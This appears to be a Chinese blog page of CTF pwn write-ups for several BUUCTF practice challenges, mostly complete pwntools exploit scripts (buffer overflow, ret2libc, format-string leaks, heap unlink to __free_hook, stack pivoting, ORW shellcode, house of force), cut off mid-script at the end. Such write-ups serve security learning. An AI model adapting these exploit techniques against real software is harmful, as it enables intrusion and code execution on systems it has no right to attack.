href="https://blog.csdn.net/weixin_51298357/article/details/113420616">picoctf_2018_leak_me_白日梦-想家的博客-CSDN博客</a></p><p>这道题一开始F5不能显示伪代码。会显示又有个地方有问题，快捷键g输入有问题的地方的地址，然后点进去先反编译有问题的这个函数，然后再出来反编译整个函数就好了</p><p>puts是用\x00分隔的，密码与name相连，相差0x100距离，我们直接把\x00填满，puts就能带出password了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>r=remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">27410</span>)<br><br>r.sendline(<span class="hljs-string">&#x27;qyq&#x27;</span>)<br>r.sendline(<span class="hljs-string">&#x27;a_reAllY_s3cuRe_p4s$word_f85406&#x27;</span>)<br>r.interactive()<br></code></pre></td></tr></table></figure><h3 id="suctf-2018-basic-pwn">suctf_2018_basic pwn</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*r=remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">27295</span>)r.sendline(<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x110</span>+<span class="hljs-string">&#x27;b&#x27;</span>*<span class="hljs-number">8</span>+p64(<span class="hljs-number">0x401157</span>))r.interactive()<br></code></pre></td></tr></table></figure><h3 id="cmcc-pwnme1">cmcc_pwnme1</h3><p>这题没找到jmp rsp 用ret2libc做</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*r=remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">26781</span>)libc = ELF(<span class="hljs-string">&#x27;./libc-2.23.so&#x27;</span>)elf = ELF(<span class="hljs-string">&#x27;./pwnme1&#x27;</span>)r.sendline(<span class="hljs-string">&#x27;5&#x27;</span>)r.sendlineafter(<span class="hljs-string">&#x27;Please input the name of fruit:&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0xa4</span>+<span class="hljs-string">&#x27;bbbb&#x27;</span>+p32(elf.sym[<span class="hljs-string">&#x27;puts&#x27;</span>])+p32(<span class="hljs-number">0x8048624</span>)+p32(elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]))puts_got=u32(r.recvuntil(<span class="hljs-string">&#x27;\xf7&#x27;</span>)[-<span class="hljs-number">4</span>:].ljust(<span class="hljs-number">4</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>))<span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(puts_got)libc_base=puts_got-libc.sym[<span class="hljs-string">&#x27;puts&#x27;</span>]og=libc_base+0x3a812r.sendlineafter(<span class="hljs-string">&#x27;Please input the name of fruit:&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0xa4</span>+<span class="hljs-string">&#x27;bbbb&#x27;</span>+p32(og))r.interactive()<br></code></pre></td></tr></table></figure><h3 id="axb-2019-heap">axb_2019_heap</h3><p>参考师傅：<a href="https://blog.csdn.net/weixin_45677731/article/details/108763362">buuctf axb_2019_heap_R1nd0的博客-CSDN博客</a></p><p>保护全开，但这题有格式化字符串漏洞，也可以off by one</p><p><strong>具体做法：</strong></p><p>1.格式化字符串漏洞泄露程序基址和libc基址</p><p>（要有程序基址才能得到bss段的地址）</p><p>例：如何得到15的偏移，先gdb填%p%p%p%p%p%p%p%p%p%p，测出输入变量的偏移为7</p><p>再调试，输入8个a，在printf(&amp;format)这里停下，看栈，__libc_start_main+240的距离偏移为8</p><p>8+7=15</p><p>2.利用off-by-one伪造chunk，free触发unlink，使chunk0指针指向它的-0x18处</p><p>3.由于got表不可改写，所以覆盖hook函数，，这里把__free_hook改为system的地址</p><p>4.还差/bin/sh，并不能直白的填/bin/sh，而是要填它所在地址所以那里要写p64(note+0x18)+“/bin/sh\x00”</p><p><strong>做题时遇到的问题：</strong></p><p>1.发现进入函数调试都不会调试都不会orz，参考师傅<a href="https://www.cnblogs.com/zhwer/p/12494317.html">gdb/pwndbg 常用命令简单整理 - 暖暖草果 - 博客园 (cnblogs.com)</a>，s  进入函数调试</p><p>2.看那个有漏洞的get_input函数看的我很懵，还有那个*((_QWORD *)&amp;note + 2 * v0) = malloc((unsigned int)size);<br>*((_DWORD *)&amp;note + 4 * SHIDWORD(size) + 2) = size;也看的很迷糊</p><p>2.这题我不知道哪里出问题，就是要输content那里，永远会让我go out，本地打通不了，只能学学思路打远端</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>local_file  = <span class="hljs-string">&#x27;./axb_2019_heap&#x27;</span><br>local_libc  = <span class="hljs-string">&#x27;./libc-2.23.so&#x27;</span><br>remote_libc = <span class="hljs-string">&#x27;./libc-2.23.so&#x27;</span><br><span class="hljs-comment">#remote_libc = &#x27;/home/glibc-all-in-one/libs/buu/libc-2.23.so&#x27;</span><br>select = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> select == <span class="hljs-number">0</span>:<br>    r = process(local_file)<br>    libc = ELF(local_libc)<br><span class="hljs-keyword">else</span>:<br>    r = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">29472</span> )<br>    libc = ELF(remote_libc)<br>elf = ELF(local_file)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = elf.arch<br>se      = <span class="hljs-keyword">lambda</span> data               :r.send(data)<br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :r.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendlineafter(delim, data)<br>sea     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>rc      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :r.recv(numb)<br>rl      = <span class="hljs-keyword">lambda</span>                    :r.recvline()<br>ru      = <span class="hljs-keyword">lambda</span> delims                         :r.recvuntil(delims)<br>uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>info    = <span class="hljs-keyword">lambda</span> tag, addr        :r.info(tag + <span class="hljs-string">&#x27;: &#123;:#x&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(addr))<br>o_g_32_old = [<span class="hljs-number">0x3ac3c</span>, <span class="hljs-number">0x3ac3e</span>, <span class="hljs-number">0x3ac42</span>, <span class="hljs-number">0x3ac49</span>, <span class="hljs-number">0x5faa5</span>, <span class="hljs-number">0x5faa6</span>]<br>o_g_32 = [<span class="hljs-number">0x3ac6c</span>, <span class="hljs-number">0x3ac6e</span>, <span class="hljs-number">0x3ac72</span>, <span class="hljs-number">0x3ac79</span>, <span class="hljs-number">0x5fbd5</span>, <span class="hljs-number">0x5fbd6</span>]<br>o_g_old = [<span class="hljs-number">0x45216</span>,<span class="hljs-number">0x4526a</span>,<span class="hljs-number">0xf02a4</span>,<span class="hljs-number">0xf1147</span>]<br>o_g = [<span class="hljs-number">0x45226</span>, <span class="hljs-number">0x4527a</span>, <span class="hljs-number">0xf0364</span>, <span class="hljs-number">0xf1207</span>]<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params">cmd=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>     gdb.attach(r,cmd)<br><span class="hljs-comment">#------------------------------------</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">idx,size,content</span>):<br>        sla(<span class="hljs-string">&#x27;&gt;&gt;&#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>        sla(<span class="hljs-string">&#x27;):&#x27;</span>,<span class="hljs-built_in">str</span>(idx))<br>        sla(<span class="hljs-string">&#x27;size:&#x27;</span>,<span class="hljs-built_in">str</span>(size))<br>        sla(<span class="hljs-string">&#x27;content:&#x27;</span>,content)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">index</span>):<br>        sla(<span class="hljs-string">&#x27;&gt;&gt; &#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>        sla(<span class="hljs-string">&#x27;Enter an index:&#x27;</span>,<span class="hljs-built_in">str</span>(index))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">index,content</span>):<br>        sla(<span class="hljs-string">&#x27;&gt;&gt; &#x27;</span>,<span class="hljs-string">&#x27;4&#x27;</span>)<br>        sla(<span class="hljs-string">&#x27;Enter an index:\n&#x27;</span>,<span class="hljs-built_in">str</span>(index))<br>        sla(<span class="hljs-string">&#x27;Enter the content: \n&#x27;</span>,content)<br><span class="hljs-comment">#---------------------------------------        </span><br>ru(<span class="hljs-string">&#x27;Enter your name: &#x27;</span>)<br>sl(<span class="hljs-string">&#x27;%15$p%19$p&#x27;</span>)<br>ru(<span class="hljs-string">&#x27;0x&#x27;</span>)<br>addr1=<span class="hljs-built_in">int</span>(ru(<span class="hljs-string">&quot;0x&quot;</span>)[:-<span class="hljs-number">2</span>],<span class="hljs-number">16</span>)<br>libc_base=addr1-<span class="hljs-number">240</span>-libc.symbols[<span class="hljs-string">&quot;__libc_start_main&quot;</span>]<br>addr2=<span class="hljs-built_in">int</span>(ru(<span class="hljs-string">&quot;\n&quot;</span>)[:-<span class="hljs-number">1</span>],<span class="hljs-number">16</span>)<br>base=addr2-<span class="hljs-number">0x116a</span><br>note=base+<span class="hljs-number">0x202060</span><br>free_hook=libc_base+libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<br>system=libc_base+libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br><span class="hljs-comment">#---------------------------------------</span><br>add(<span class="hljs-number">0</span>,<span class="hljs-number">0x98</span>,<span class="hljs-string">&#x27;aaaa&#x27;</span>)<span class="hljs-comment">#0</span><br>add(<span class="hljs-number">1</span>,<span class="hljs-number">0x90</span>,<span class="hljs-string">&#x27;aaaa&#x27;</span>)<span class="hljs-comment">#1</span><br>fake_chunk=p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x90</span>)<br>fake_chunk+=p64(note-<span class="hljs-number">0x18</span>)+p64(note-<span class="hljs-number">0x10</span>)<br>fake_chunk+=<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x70</span><br>fake_chunk+=p64(<span class="hljs-number">0x90</span>)+p8(<span class="hljs-number">0xa0</span>)<br>edit(<span class="hljs-number">0</span>,fake_chunk)<br>free(<span class="hljs-number">1</span>)<br>edit(<span class="hljs-number">0</span>,p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span>+p64(free_hook)+p64(<span class="hljs-number">0x38</span>)+p64(note+<span class="hljs-number">0x18</span>)+<span class="hljs-string">&quot;/bin/sh\x00&quot;</span>)<br>edit(<span class="hljs-number">0</span>,p64(system))<br>free(<span class="hljs-number">1</span>)<br><span class="hljs-comment">#debug()</span><br>r.interactive()<br></code></pre></td></tr></table></figure><h3 id="actf-2019-babystack">actf_2019_babystack</h3><p>这题只能溢出0xe0-0xd0=0x10</p><p>但这题给出了栈中变量所在的地址，用<strong>栈迁移</strong></p><p>（原本leave的地方填要迁移的地址，原本ret的地方填leave；ret的地址，还有就是迁移位置要填充8个a）</p><p><strong>做题时遇到的问题：</strong></p><p>1.libc.sym[‘main’]不能用，直接ida找main地址</p><p>2.送payload要用send，不能用sendline，不然不好接受泄露的值</p><p>3.我这个exp模板og好像只有u16，没发现本来</p><p><strong>记一下方法，备忘：</strong></p><p>1.one_gadget <a href="http://libc-2.27.so">libc-2.27.so</a></p><p>2.ROPgadget --binary ./ACTF_2019_babystack |grep “leave”</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>local_file  = <span class="hljs-string">&#x27;./ACTF_2019_babystack&#x27;</span><br>local_libc  = <span class="hljs-string">&#x27;./libc-2.27.so&#x27;</span><br>remote_libc = <span class="hljs-string">&#x27;./libc-2.27.so&#x27;</span><br><span class="hljs-comment">#remote_libc = &#x27;/home/glibc-all-in-one/libs/buu/libc-2.23.so&#x27;</span><br>select = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> select == <span class="hljs-number">0</span>:<br>    r = process(local_file)<br>    libc = ELF(local_libc)<br><span class="hljs-keyword">else</span>:<br>    r = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">29161</span> )<br>    libc = ELF(remote_libc)<br>elf = ELF(local_file)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = elf.arch<br>se      = <span class="hljs-keyword">lambda</span> data               :r.send(data)<br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :r.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendlineafter(delim, data)<br>sea     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>rc      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :r.recv(numb)<br>rl      = <span class="hljs-keyword">lambda</span>                    :r.recvline()<br>ru      = <span class="hljs-keyword">lambda</span> delims                         :r.recvuntil(delims)<br>uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>info    = <span class="hljs-keyword">lambda</span> tag, addr        :r.info(tag + <span class="hljs-string">&#x27;: &#123;:#x&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(addr))<br>o_g_32_old = [<span class="hljs-number">0x3ac3c</span>, <span class="hljs-number">0x3ac3e</span>, <span class="hljs-number">0x3ac42</span>, <span class="hljs-number">0x3ac49</span>, <span class="hljs-number">0x5faa5</span>, <span class="hljs-number">0x5faa6</span>]<br>o_g_32 = [<span class="hljs-number">0x3ac6c</span>, <span class="hljs-number">0x3ac6e</span>, <span class="hljs-number">0x3ac72</span>, <span class="hljs-number">0x3ac79</span>, <span class="hljs-number">0x5fbd5</span>, <span class="hljs-number">0x5fbd6</span>]<br>o_g_old = [<span class="hljs-number">0x45216</span>,<span class="hljs-number">0x4526a</span>,<span class="hljs-number">0xf02a4</span>,<span class="hljs-number">0xf1147</span>]<br>o_g = [<span class="hljs-number">0x45226</span>, <span class="hljs-number">0x4527a</span>, <span class="hljs-number">0xf0364</span>, <span class="hljs-number">0xf1207</span>]<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params">cmd=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>     gdb.attach(r,cmd)<br><span class="hljs-comment">#-----------------------------</span><br>leave_ret=<span class="hljs-number">0x400a18</span><br>ret=<span class="hljs-number">0x400709</span><br>pop_rdi=<span class="hljs-number">0x400ad3</span><br>puts_got=elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>puts_plt=elf.sym[<span class="hljs-string">&#x27;puts&#x27;</span>]<br><span class="hljs-comment">#main=elf.sym[&#x27;main&#x27;]</span><br>sleep(<span class="hljs-number">4</span>)<br>sl(<span class="hljs-string">&#x27;224&#x27;</span>)<br>ru(<span class="hljs-string">&#x27;Your message will be saved at 0x&#x27;</span>)<br>addr=<span class="hljs-built_in">int</span>(rc(<span class="hljs-number">12</span>),<span class="hljs-number">16</span>)<br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(addr)<br>se(<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">8</span>+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(<span class="hljs-number">0x4008f6</span>)+<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0xa8</span>+p64(addr)+p64(leave_ret))<br>ru(<span class="hljs-string">&#x27;Byebye~&#x27;</span>)<br>puts_addr=uu64(ru(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:])<br>base=puts_addr-libc.sym[<span class="hljs-string">&#x27;puts&#x27;</span>]<br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(base)<br>shell=base+<span class="hljs-number">0x4f2c5</span><br>sla(<span class="hljs-string">&#x27;&gt;&#x27;</span>,<span class="hljs-string">&#x27;224&#x27;</span>)<br>ru(<span class="hljs-string">&#x27;&gt;&#x27;</span>)<br>se(<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0xd0</span>+<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">8</span>+p64(shell))<br>r.interactive()<br></code></pre></td></tr></table></figure><h3 id="picoctf-2018-got-shell：">picoctf_2018_got_shell：</h3><p>用hex输出和用sendline</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br><span class="hljs-comment">#r=process(&#x27;./PicoCTF_2018_got-shell&#x27;)</span><br>r=remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">28451</span>)<br>elf = ELF(<span class="hljs-string">&#x27;./PicoCTF_2018_got-shell&#x27;</span>)<br>backdoor=<span class="hljs-number">0x804854b</span><br>r.sendline(<span class="hljs-built_in">hex</span>(elf.got[<span class="hljs-string">&#x27;exit&#x27;</span>]))<br>r.sendline(<span class="hljs-built_in">hex</span>(backdoor))<br>r.interactive()<br></code></pre></td></tr></table></figure><h3 id="极客大挑战-2019-Not-Bad">[极客大挑战 2019]Not Bad</h3><p>这题可以溢出0x18，但buf所在的栈太小不够用rop来orw，解法：栈溢出处构造rop跳转至mmap申请的区域处执行</p><p>里面的orw命令读取flag</p><p>**工具使用：**seccomp-tools dump ./bad</p><p>看到可用read，write，open，exit</p><p><strong>参考师傅：</strong>[<a href="https://blog.csdn.net/mcmuyanga/article/details/113389703?spm=1001.2101.3001.6650.7&amp;utm_medium=distribute.pc_relevant.none-task-blog-2~default~OPENSEARCH~default-7.no_search_link&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~OPENSEARCH~default-7.no_search_link">BUUCTF]PWN——[极客大挑战 2019]Not Bad （orw_shellcode）_mcmuyanga的博客-CSDN博客</a></p><p>​       gdb调试该题：[<a href="https://blog.csdn.net/weixin_46521144/article/details/115196495">BUUCTF]PWN——[极客大挑战 2019]Not Bad详细解释_N1ch0l4s的博客-CSDN博客</a></p><p>jmp命令：无条件的转移到指令指定的地址去执行从该地址开始的命令</p><p>（jmp rsp 可以把使程序执行到栈上rsp的位置）</p><p><strong>orw命令：</strong>  一般都是这样</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">mmap=<span class="hljs-number">0x123000</span><br>orw_payload=shellcraft.<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;./flag&#x27;</span>)           <span class="hljs-comment">#打开根目录下的flag文件</span><br>orw_payload+=shellcraft.read(<span class="hljs-number">3</span>,mmap,<span class="hljs-number">0x50</span>)       <span class="hljs-comment">#读取文件标识符是3的文件0x50个字节存放到mmap分配的地址空间里</span><br>orw_payload+=shellcraft.write(<span class="hljs-number">1</span>,mmap,<span class="hljs-number">0x50</span>)      <span class="hljs-comment">#将mmap地址上的内容输出0x50个字节</span><br></code></pre></td></tr></table></figure><p><strong>mmap函数里的保护类权限</strong>：<br>PROT_READ是0x1<br>PROT_WRITE是0x2<br>PROT_EXEC是0x4</p><p>mmap申请的参数这里是6，可写可执行，也可用gdb调试，用vmmap看rwx</p><p><strong>具体解题步骤：</strong></p><p>1.构造rop链,使其可以调用read往mmap里读入0x100大小的数据，然后跳入0x123000执行接收flag</p><p>2.填入orw语句</p><p><strong>paload1解释：</strong></p><p>1.调用read往mmap里读入0x100大小的数据，然后跳入0x123000执行接收flag</p><p>2.用\x00填充至刚好覆盖rbp</p><p>3.返回地址填jmp rsp，使rip执行到栈上，rsp再减去0x30到buf处，再用jmp rsp控制rip到buf处执行</p><p>4.然后就能执行最前面的语句，调用read往mmap里读入0x100大小的数据，然后跳入0x123000执行</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>context.arch=<span class="hljs-string">&#x27;amd64&#x27;</span><br><span class="hljs-comment">#r=remote(&#x27;node4.buuoj.cn&#x27;,28690)</span><br>r=process(<span class="hljs-string">&#x27;./bad&#x27;</span>)<br>mmap=<span class="hljs-number">0x123000</span><br>jmp_rsp=<span class="hljs-number">0x400A01</span><br><span class="hljs-comment">#print len(asm(&quot;sub rsp,0x30;jmp rsp&quot;))</span><br><span class="hljs-comment">#pause()</span><br><span class="hljs-comment">#gdb.attach(r,&quot;b *0x400A49&quot;)</span><br>r.recvuntil(<span class="hljs-string">&#x27;have fun!&#x27;</span>)<br>payload1=asm(shellcraft.read(<span class="hljs-number">0</span>,mmap,<span class="hljs-number">0x100</span>))+asm(<span class="hljs-string">&#x27;mov rax,0x123000;call rax&#x27;</span>)<br>payload1=payload1.ljust(<span class="hljs-number">0x28</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>)<br>payload1+=p64(jmp_rsp)<br>payload1+=asm(<span class="hljs-string">&quot;sub rsp,0x30;jmp rsp&quot;</span>)<br>r.send(payload1)<br>orw_payload=shellcraft.<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;./flag&#x27;</span>)<br>orw_payload+=shellcraft.read(<span class="hljs-number">3</span>,mmap,<span class="hljs-number">0x50</span>)   <br>orw_payload+=shellcraft.write(<span class="hljs-number">1</span>,mmap,<span class="hljs-number">0x50</span>)      <br>r.send(asm(orw_payload))<br>r.interactive()<br></code></pre></td></tr></table></figure><h3 id="gyctf-2020-force">gyctf_2020_force</h3><p><strong>参考师傅</strong>：<a href="https://blog.csdn.net/weixin_44145820/article/details/105522043">BUUCTF-PWN gyctf_2020_force（house of force）_L.o.W的博客-CSDN博客</a></p><p><a href="https://blog.csdn.net/qq_43986365/article/details/107976352">House of force —— gyctf_2020_force_PLpa的博客-CSDN博客</a></p><p>用house of force，修改malloc_hook为og</p><p><strong>具体步骤：</strong></p><p>1.分配一个大小超过 mmap 分配大小的堆，经 mmap 分配后地址与 libc 有固定偏移，由于本题<strong>告知了chunk地址</strong>，我gdb的vmmap看一下，得到的地址加一下就是libc_base</p><p>还能顺便得到heap的基址，进而得知topchunk的ptr</p><p>得知og，realloc</p><p>2.再申请个堆，利用house of force把malloc_hook-8改为og，malloc_hook改为realloc</p><p>3.再尝试申请堆，开shell</p><p>主要说一下offset-0xf-0x8-0x10-0x8，首先起码要减-0xf-0x8,又因为chunk的缘故，防止chunk的size盖掉，所以要-0x10</p><p>再调试看看，再-0x8的话填充8个‘a’，就能把og和realloc_hook布置好了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>local_file  = <span class="hljs-string">&#x27;./gyctf_2020_force&#x27;</span><br>local_libc  = <span class="hljs-string">&#x27;./libc-2.23.so&#x27;</span><br>remote_libc = <span class="hljs-string">&#x27;./libc-2.23.so&#x27;</span><br><span class="hljs-comment">#remote_libc = &#x27;/home/glibc-all-in-one/libs/buu/libc-2.23.so&#x27;</span><br>select = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> select == <span class="hljs-number">0</span>:<br>    r = process(local_file)<br>    libc = ELF(local_libc)<br><span class="hljs-keyword">else</span>:<br>    r = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">27923</span> )<br>    libc = ELF(remote_libc)<br>elf = ELF(local_file)<br><span 